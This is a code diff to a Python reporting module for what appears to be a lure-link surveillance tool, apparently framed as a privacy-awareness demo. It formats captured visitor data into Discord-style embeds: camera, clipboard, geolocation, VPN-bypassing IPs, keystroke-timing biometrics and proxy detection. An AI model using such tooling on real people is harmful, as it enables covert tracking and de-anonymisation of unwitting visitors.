@@ -278,8 +278,21 @@ def create_combined_surveillance_embed(data, recognition_info=None, dc_handle=No
         add("Transport Profile")
     if isinstance(data.get("_serverCveMatches"), dict) and data["_serverCveMatches"].get("count", 0) > 0:
         critical_data_found = add("CVE Exposure", critical=True) or critical_data_found
+    # Phase B vectors
+    if _is_valid_dict(data.get("automationDetect")):
+        add("Automation Detection")
+    if _is_valid_dict(data.get("intlLocale")):
+        add("Locale Intelligence")
+    if _is_valid_dict(data.get("privacySignals")):
+        add("Privacy Signals")
+    if _is_valid_dict(data.get("plugins")):
+        add("Plugin Fingerprint")
+    if _is_valid_dict(data.get("platformAuthenticator")):
+        add("Biometric Hardware")
+    if _is_valid_dict(data.get("gamepads")):
+        add("Gamepad Enumeration")
 
-    total_categories = 36
+    total_categories = 42
     categories_captured = len(captured_categories)
     success_rate = int((categories_captured / total_categories) * 100)
     threat_label_ansi, embed_color = get_threat_indicator(success_rate)
@@ -330,6 +343,11 @@ def create_combined_surveillance_embed(data, recognition_info=None, dc_handle=No
         }
     )
 
+    # ---- Request route (the exact lure URL the target clicked) ----
+    request_field = _build_request_field(data)
+    if request_field:
+        embed["fields"].append(request_field)
+
     # ---- Device recognition ----
     if recognition_info:
         embed["fields"].append(_build_recognition_field(recognition_info))
@@ -375,6 +393,11 @@ def create_combined_surveillance_embed(data, recognition_info=None, dc_handle=No
             }
         )
 
+    # ---- Phase C: Behavioral biometrics ----
+    behavioral_field = _build_behavioral_field(data)
+    if behavioral_field:
+        embed["fields"].append(behavioral_field)
+
     # ---- UA Client Hints / Browser identity ----
     ua_field = _build_ua_client_hints_field(data)
     if ua_field:
@@ -415,8 +438,48 @@ def create_combined_surveillance_embed(data, recognition_info=None, dc_handle=No
     if cve_field:
         embed["fields"].append(cve_field)
 
+    # ---- Phase B: Automation & spoofing + plugins ----
+    automation_field = _build_automation_field(data)
+    if automation_field:
+        embed["fields"].append(automation_field)
+
+    # ---- Phase B: Locale intelligence ----
+    intl_field = _build_intl_locale_field(data)
+    if intl_field:
+        embed["fields"].append(intl_field)
+
+    # ---- Phase B: Privacy signals ----
+    privacy_field = _build_privacy_signals_field(data)
+    if privacy_field:
+        embed["fields"].append(privacy_field)
+
+    # ---- Phase B: Rare hardware (authenticator + gamepads) ----
+    rare_hw_field = _build_rare_hardware_field(data)
+    if rare_hw_field:
+        embed["fields"].append(rare_hw_field)
+
+    # ---- Phase D: Server-side ASN / hosting ----
+    asn_field = _build_asn_field(data)
+    if asn_field:
+        embed["fields"].append(asn_field)
+
+    # ---- Phase D: Protocol posture ----
+    protocol_field = _build_protocol_field(data)
+    if protocol_field:
+        embed["fields"].append(protocol_field)
+
+    # ---- Phase D: Language profile ----
+    language_field = _build_language_field(data)
+    if language_field:
+        embed["fields"].append(language_field)
+
     # ---- Risk assessment ----
     embed["fields"].append(_build_risk_assessment(data))
+
+    # ---- Victim-facing impact showcase ----
+    impact_field = _build_impact_field(data)
+    if impact_field:
+        embed["fields"].append(impact_field)
 
     # ---- Captured vectors summary ----
     if captured_categories:
@@ -455,6 +518,311 @@ def create_combined_surveillance_embed(data, recognition_info=None, dc_handle=No
     )
 
     return embed
+
+
+def _build_request_field(data):
+    """Render the request-route (lure URL / referer) captured server-side."""
+    r = data.get("_serverRequest")
+    if not isinstance(r, dict) or not r:
+        return None
+
+    lines = []
+    if r.get("fullUrl"):
+        lines.append(f"**Lure URL:** `{r['fullUrl']}`")
+    elif r.get("path"):
+        path_line = f"**Path:** `{r['path']}`"
+        if r.get("query"):
+            path_line += f" `?{r['query']}`"
+        lines.append(path_line)
+
+    meta = []
+    if r.get("method"):
+        meta.append(f"**Method:** `{r['method']}`")
+    if r.get("host"):
+        meta.append(f"**Host:** `{r['host']}`")
+    if meta:
+        lines.append(" · ".join(meta))
+
+    if r.get("referer"):
+        lines.append(f"**Referer:** `{str(r['referer'])[:120]}`")
+    if r.get("accessTime"):
+        lines.append(f"**Accessed:** `{r['accessTime']}`")
+
+    if not lines:
+        return None
+    return {"name": "🧭 Request Route", "value": "\n".join(lines), "inline": False}
+
+
+def _build_impact_field(data):
+    """Victim-facing plain-language summary of what an attacker just learned."""
+    impacts = []
+
+    if _is_valid_dict(data.get("geolocation")) and data["geolocation"].get("latitude") is not None:
+        impacts.append("Your real-world location, within a few meters")
+    if data.get("camera", {}).get("captured"):
+        impacts.append("A still image from your camera")
+    if _is_valid_dict(data.get("clipboard")):
+        impacts.append("Whatever was on your clipboard (passwords?)")
+    if data.get("webrtc") and data["webrtc"].get("leakDetected"):
+        impacts.append("Your local network IP — bypasses your VPN")
+    media = data.get("mediaDevices")
+    if isinstance(media, list) and media:
+        impacts.append("How many cameras & microphones you have")
+    if data.get("canvas") or _is_valid_dict(data.get("webgl")):
+        impacts.append("A stable device ID to re-identify you on other sites")
+    fonts = data.get("fonts")
+    if fonts and not (isinstance(fonts, dict) and fonts.get("error")):
+        if isinstance(fonts, dict) and fonts.get("count", 0):
+            impacts.append("Your operating system, inferred from fonts")
+    if data.get("browser", {}).get("hardwareConcurrency") or data.get("deviceMemory"):
+        impacts.append("Your hardware specs (CPU cores / RAM)")
+    if _is_valid_dict(data.get("battery")):
+        impacts.append("Battery level and charging state")
+    if data.get("timezone"):
+        impacts.append("Your timezone and likely region")
+    perms = data.get("permissions") or {}
+    if _is_valid_dict(perms) and any(v == "granted" for v in perms.values()):
+        impacts.append("Browser permissions you had pre-granted")
+    cve = data.get("_serverCveMatches") or {}
+    if isinstance(cve, dict) and cve.get("count", 0):
+        impacts.append("Your browser is outdated and remotely exploitable")
+    # Phase B impact lines
+    auto = data.get("automationDetect")
+    if _is_valid_dict(auto) and (auto.get("likelyBot") or auto.get("uaSpoofed")):
+        impacts.append("Whether you're a real person or an automated script")
+    intl = data.get("intlLocale")
+    if _is_valid_dict(intl):
+        impacts.append("Your cultural and calendar system, revealing your region")
+    ps = data.get("privacySignals")
+    if _is_valid_dict(ps):
+        impacts.append("Whether you tried to opt out of tracking (and that it can be ignored)")
+    auth = data.get("platformAuthenticator")
+    if _is_valid_dict(auth):
+        impacts.append("Whether your device has biometric authentication")
+    pads = data.get("gamepads")
+    if _is_valid_dict(pads) and pads.get("count", 0) > 0:
+        impacts.append("Specific game controller models you own")
+    # Phase D impact lines
+    asn = data.get("_serverAsn")
+    if isinstance(asn, dict) and asn:
+        impacts.append("Your ISP and whether you're on a real or hosting connection")
+    lang = data.get("_serverLanguage")
+    if isinstance(lang, dict) and lang.get("geoMismatch"):
+        impacts.append("That your language doesn't match your claimed location")
+
+    if not impacts:
+        return None
+
+    bullets = "\n".join(f"• {i}" for i in impacts[:8])
+    value = (
+        "**If this were a real attack, the operator would now know:**\n"
+        f"{bullets}\n\n"
+        "_This is the same data any ordinary website can collect silently._"
+    )
+    return {"name": "⚠️ Why This Matters", "value": value, "inline": False}
+
+
+def _build_automation_field(data):
+    """Automation/bot detection + plugin fingerprint (combined to save fields)."""
+    auto = data.get("automationDetect")
+    plugins = data.get("plugins")
+    parts = []
+
+    if _is_valid_dict(auto):
+        lines = [f"**webdriver flag:** {'🤖 true' if auto.get('webdriver') else '✅ false'}"]
+        indicators = auto.get("headlessIndicators") or []
+        if indicators:
+            lines.append(f"**Headless indicators:** {', '.join(f'`{i}`' for i in indicators)}")
+        lines.append(f"**JS engine:** `{auto.get('jsEngine', '?')}` (stack: `{auto.get('stackFormat', '?')}`)")
+        if auto.get("uaSpoofed"):
+            lines.append("⚠️ **UA spoofing detected** — engine doesn't match claimed browser")
+        lines.append(f"**Bot score:** `{auto.get('botScore', 0)}/100` · {'🤖 likely bot' if auto.get('likelyBot') else '✅ likely human'}")
+        parts.append("🤖 **Automation detection**\n└ " + "\n└ ".join(lines))
+
+    if _is_valid_dict(plugins):
+        names = plugins.get("names") or []
+        parts.append(
+            f"🔌 **Plugin fingerprint**\n"
+            f"└ {plugins.get('count', 0)} plugins · PDF viewer: `{plugins.get('pdfViewerEnabled', '?')}`"
+            + (f"\n└ Names: {', '.join(f'`{n}`' for n in names[:5])}" if names else "")
+        )
+
+    if not parts:
+        return None
+    return {"name": "🤖 Automation & Spoofing", "value": "\n\n".join(parts), "inline": False}
+
+
+def _build_intl_locale_field(data):
+    """Intl locale intelligence — calendar, numbering, collation reveal region."""
+    intl = data.get("intlLocale")
+    if not _is_valid_dict(intl):
+        return None
+
+    calendar_hints = {
+        "islamic": "Middle East / Islamic region",
+        "islamic-civil": "Middle East / Islamic region",
+        "islamic-umalqura": "Saudi Arabia",
+        "persian": "Iran / Afghanistan",
+        "buddhist": "Thailand / Cambodia",
+        "japanese": "Japan",
+        "hebrew": "Israel",
+        "chinese": "China / Taiwan",
+        "indian": "India",
+        "ethiopic": "Ethiopia",
+        "coptic": "Egypt",
+    }
+    cal = intl.get("calendar", "")
+    region_hint = calendar_hints.get(cal, "")
+
+    lines = [
+        f"**Locale:** `{intl.get('locale', '?')}`",
+        f"**Calendar:** `{cal}`" + (f" → _{region_hint}_" if region_hint else ""),
+        f"**Numbering:** `{intl.get('numberingSystem', '?')}`",
+        f"**Hour cycle:** `{intl.get('hourCycle', '?')}` (12h: `{intl.get('hour12', '?')}`)",
+        f"**Collation:** `{intl.get('collation', '?')}` · sensitivity `{intl.get('sensitivity', '?')}`",
+    ]
+    plural_cats = intl.get("pluralCategories") or []
+    if plural_cats:
+        lines.append(f"**Plural rules:** `{', '.join(plural_cats)}`")
+
+    return {"name": "🌍 Locale Intelligence", "value": "\n".join(lines), "inline": False}
+
+
+def _build_privacy_signals_field(data):
+    """Privacy opt-out signals (GPC, DNT, Sec-GPC) — advisory, not enforced."""
+    ps = data.get("privacySignals")
+    if not _is_valid_dict(ps):
+        return None
+
+    gpc = ps.get("gpc")
+    dnt = ps.get("dnt")
+    sec_gpc = ps.get("secGpcHeader")
+
+    lines = []
+    gpc_status = "✅ enabled (opt-out requested)" if gpc is True else ("❌ disabled" if gpc is False else "— not set")
+    lines.append(f"**Global Privacy Control:** {gpc_status}")
+    dnt_status = "✅ enabled" if str(dnt) == "1" else ("❌ disabled" if str(dnt) == "0" else "— not set")
+    lines.append(f"**Do Not Track:** {dnt_status}")
+    if sec_gpc:
+        lines.append(f"**Sec-GPC header:** `{sec_gpc}`")
+
+    if gpc is not True and str(dnt) != "1":
+        lines.append("\n⚠️ _No privacy opt-out signals detected — all tracking permitted by default._")
+    else:
+        lines.append("\n⚠️ _Opt-out signals are advisory — this site detected and can ignore them._")
+
+    return {"name": "🚫 Privacy Signals", "value": "\n".join(lines), "inline": False}
+
+
+def _build_rare_hardware_field(data):
+    """Platform authenticator + gamepad enumeration — rare hardware signals."""
+    parts = []
+
+    auth = data.get("platformAuthenticator")
+    if _is_valid_dict(auth):
+        status = "✅ available" if auth.get("platformAuthenticatorAvailable") else "❌ not available"
+        parts.append(
+            f"🔐 **Biometric authenticator**\n"
+            f"└ Platform authenticator (Touch ID / Windows Hello): {status}"
+        )
+
+    pads = data.get("gamepads")
+    if _is_valid_dict(pads):
+        count = pads.get("count", 0)
+        if count > 0:
+            pad_list = pads.get("gamepads") or []
+            pad_str = ", ".join(
+                f"`{p.get('id', '?')}` ({p.get('buttons', '?')} btns)"
+                for p in pad_list[:3]
+            )
+            parts.append(
+                f"🎮 **Game controllers**\n"
+                f"└ {count} connected · {pad_str}"
+            )
+        else:
+            parts.append("🎮 **Game controllers**\n└ _none connected_")
+
+    if not parts:
+        return None
+    return {"name": "🎮 Rare Hardware", "value": "\n\n".join(parts), "inline": False}
+
+
+def _build_asn_field(data):
+    """Server-side ASN / hosting organization lookup."""
+    asn = data.get("_serverAsn")
+    if not isinstance(asn, dict) or not asn:
+        return None
+
+    lines = [
+        f"**ASN:** `{asn.get('asn', '?')}` · Org: `{asn.get('organization', '?')}`",
+    ]
+    if asn.get("network"):
+        lines.append(f"**Network:** `{asn['network']}`")
+    classification = asn.get("classification", "")
+    if classification:
+        lines.append(f"**Classification:** {classification}")
+
+    return {"name": "🏢 ASN / Hosting", "value": "\n".join(lines), "inline": False}
+
+
+def _build_protocol_field(data):
+    """Server-side protocol / connection posture."""
+    proto = data.get("_serverProtocol")
+    if not isinstance(proto, dict) or not proto:
+        return None
+
+    lines = []
+    scheme = proto.get("schemeObserved")
+    if scheme:
+        lines.append(f"**Scheme:** `{scheme}`")
+    if proto.get("cloudflareEdge"):
+        lines.append(f"**Cloudflare edge:** ✅ (Ray `{proto.get('cfRay', '—')}`)")
+    depth = proto.get("proxyChainDepth", 1)
+    lines.append(f"**Proxy chain depth:** `{depth}` hop(s)")
+    consistent = proto.get("protoConsistency")
+    if consistent:
+        lines.append("**Protocol consistency:** ✅ all agree")
+    else:
+        lines.append("⚠️ **Protocol mismatch** — possible downgrade")
+    if depth > 2:
+        lines.append("⚠️ Deep proxy chain — possible Tor/VPN nesting")
+    if proto.get("ipSource"):
+        lines.append(f"**IP source:** `{proto['ipSource']}`")
+
+    return {"name": "🔌 Protocol Posture", "value": "\n".join(lines), "inline": False}
+
+
+def _build_language_field(data):
+    """Server-side Accept-Language profile analysis."""
+    lang = data.get("_serverLanguage")
+    if not isinstance(lang, dict) or not lang:
+        return None
+
+    lines = [
+        f"**Primary:** `{lang.get('primary', '?')}` "
+        f"({lang.get('primaryLanguage', '?')} · {lang.get('region') or '—'})",
+    ]
+
+    languages = lang.get("languages") or []
+    if languages:
+        lang_str = ", ".join(
+            f"`{e.get('tag', '?')}` (q={e.get('q', 1.0)})" for e in languages[:6]
+        )
+        lines.append(f"**Languages:** {lang_str}")
+
+    entropy = lang.get("entropyBits", 0)
+    if entropy:
+        label = "multilingual" if entropy > 1.5 else "standard"
+        lines.append(f"**Entropy:** `{entropy} bits` ({label})")
+
+    if lang.get("geoMismatch"):
+        primary = lang.get("primaryLanguage", "?")
+        cc = lang.get("geoCountryCode", "?")
+        lines.append(f"⚠️ Language/geo mismatch — primary `{primary}` but IP is `{cc}`")
+    else:
+        lines.append("**Geo mismatch:** ✅ consistent")
+
+    return {"name": "🗣️ Language Profile", "value": "\n".join(lines), "inline": False}
 
 
 def _build_recognition_field(recognition_info):
@@ -685,11 +1053,10 @@ def _build_advanced_fingerprinting(data):
 
     if data.get("behavioral"):
         beh = data["behavioral"]
-        moves = len(beh.get("mouseMovements", []) or [])
-        visible = beh.get("pageVisible", False)
+        moves = beh.get("mouseMoveCount", len(beh.get("mouseMovements", []) or []))
         items.append(
             f"🖱️ **Behavioral tracking**\n"
-            f"└ Mouse events `{moves}` · page {'visible' if visible else 'hidden'}"
+            f"└ See BEHAVIORAL BIOMETRICS field below"
         )
 
     sensors = data.get("sensors")
@@ -705,6 +1072,66 @@ def _build_advanced_fingerprinting(data):
             )
 
     return items
+
+
+def _build_behavioral_field(data):
+    """Render behavioral biometrics — dwell, scroll, mouse/click/keystroke/touch timing."""
+    beh = data.get("behavioral")
+    if not _is_valid_dict(beh):
+        return None
+
+    lines = []
+
+    # Dwell time
+    dwell = beh.get("dwellMs", 0)
+    if dwell and dwell > 0:
+        lines.append(f"└ Dwell `{dwell / 1000:.1f}s`")
+
+    # Scroll depth
+    max_scroll = beh.get("maxScrollPct", 0)
+    if max_scroll is not None:
+        lines.append(f"└ Max scroll `{max_scroll}%`")
+
+    # Mouse
+    mouse_count = beh.get("mouseMoveCount", 0)
+    mouse_sampled = len(beh.get("mouseMovements", []) or [])
+    click_count = beh.get("clickCount", 0)
+    if mouse_count or click_count:
+        lines.append(f"└ Mouse: `{mouse_count}` moves ({mouse_sampled} sampled) · `{click_count}` clicks")
+
+    # Keystrokes — timing only, never content
+    keystroke_count = beh.get("keystrokeCount", 0)
+    if keystroke_count:
+        keystrokes = beh.get("keypresses", []) or []
+        dwell_times = [k.get("dwellMs") for k in keystrokes if k.get("dwellMs") is not None]
+        gaps = [k.get("gapMs") for k in keystrokes if k.get("gapMs") and k.get("gapMs") > 0]
+        stats = ""
+        if dwell_times:
+            mean_dwell = sum(dwell_times) / len(dwell_times)
+            stats += f"dwell μ `{mean_dwell:.0f}ms`"
+        if gaps:
+            mean_gap = sum(gaps) / len(gaps)
+            stats += f" · gap μ `{mean_gap:.0f}ms`" if stats else f"gap μ `{mean_gap:.0f}ms`"
+        lines.append(f"└ Keystrokes: `{keystroke_count}`" + (f" ({stats})" if stats else "") + "  [timing only — no content]")
+
+    # Touch
+    touch_count = beh.get("touchCount", 0)
+    if touch_count:
+        lines.append(f"└ Touch: `{touch_count}` events")
+
+    # Visibility transitions
+    transitions = beh.get("visibilityTransitions", []) or []
+    if transitions:
+        seq = "→".join(t.get("state", "?") for t in transitions[-5:])
+        lines.append(f"└ Focus: `{seq}` ({len(transitions)} transitions)")
+
+    if not lines:
+        return None
+
+    lines.append("")
+    lines.append("_Behavioral biometrics re-identify you across sessions even after you clear cookies — your typing rhythm and mouse path are near-unique._")
+
+    return {"name": "🖱️ BEHAVIORAL BIOMETRICS", "value": "\n".join(lines), "inline": False}
 
 
 def _build_risk_assessment(data):
@@ -750,6 +1177,15 @@ def _build_risk_assessment(data):
     if data.get("behavioral") and data.get("behavioral", {}).get("mouseMovements"):
         score += 15
         risk_factors.append("Behavioral tracking active")
+    # Phase C: enriched behavioral scoring
+    beh = data.get("behavioral") or {}
+    if isinstance(beh, dict) and not beh.get("error"):
+        if beh.get("keystrokes") or beh.get("keystrokeCount", 0) > 0:
+            score += 10
+            risk_factors.append("Keystroke cadence captured")
+        if beh.get("dwellMs", 0) > 5000:
+            score += 5
+            risk_factors.append("Extended dwell time")
 
     if data.get("sensors") and len(data.get("sensors", {})) > 0:
         score += 20
@@ -799,6 +1235,57 @@ def _build_risk_assessment(data):
         risk_factors.append(
             f"Outdated browser ({cve['count']} CVE, CVSS {cve.get('max_cvss', 0):.1f})"
         )
+
+    # Phase B risk scoring
+    auto = data.get("automationDetect") or {}
+    if _is_valid_dict(auto):
+        if auto.get("likelyBot"):
+            score += 15
+            risk_factors.append("Automation/bot detected")
+        if auto.get("uaSpoofed"):
+            score += 10
+            risk_factors.append("User-Agent spoofing detected")
+    intl = data.get("intlLocale") or {}
+    if _is_valid_dict(intl):
+        cal = intl.get("calendar", "")
+        if cal and cal not in ("gregory", "iso8601"):
+            score += 5
+            risk_factors.append("Locale reveals non-Western region")
+    ps = data.get("privacySignals") or {}
+    if _is_valid_dict(ps):
+        if ps.get("gpc") is False and str(ps.get("dnt")) != "1":
+            score += 5
+            risk_factors.append("No privacy opt-out signals")
+    auth = data.get("platformAuthenticator") or {}
+    if _is_valid_dict(auth) and auth.get("platformAuthenticatorAvailable"):
+        score += 3
+        risk_factors.append("Biometric hardware detected")
+    pads = data.get("gamepads") or {}
+    if _is_valid_dict(pads) and pads.get("count", 0) > 0:
+        score += 5
+        risk_factors.append("Rare hardware (game controller) connected")
+    # Phase D risk scoring
+    asn = data.get("_serverAsn")
+    if isinstance(asn, dict) and asn:
+        classification = asn.get("classification", "")
+        if "Datacenter" in classification:
+            score += 15
+            risk_factors.append("Datacenter/hosting ASN detected")
+        elif "VPN" in classification or "Hosting" in classification:
+            score += 10
+            risk_factors.append("VPN/hosting ASN detected")
+    proto = data.get("_serverProtocol")
+    if isinstance(proto, dict) and proto:
+        if proto.get("protoConsistency") is False:
+            score += 10
+            risk_factors.append("Protocol scheme mismatch")
+        if proto.get("proxyChainDepth", 1) > 2:
+            score += 10
+            risk_factors.append("Deep proxy chain")
+    lang = data.get("_serverLanguage")
+    if isinstance(lang, dict) and lang.get("geoMismatch"):
+        score += 15
+        risk_factors.append("Language/geo mismatch")
 
     score = min(score, 100)
     risk_label_ansi, _ = get_threat_indicator(score)
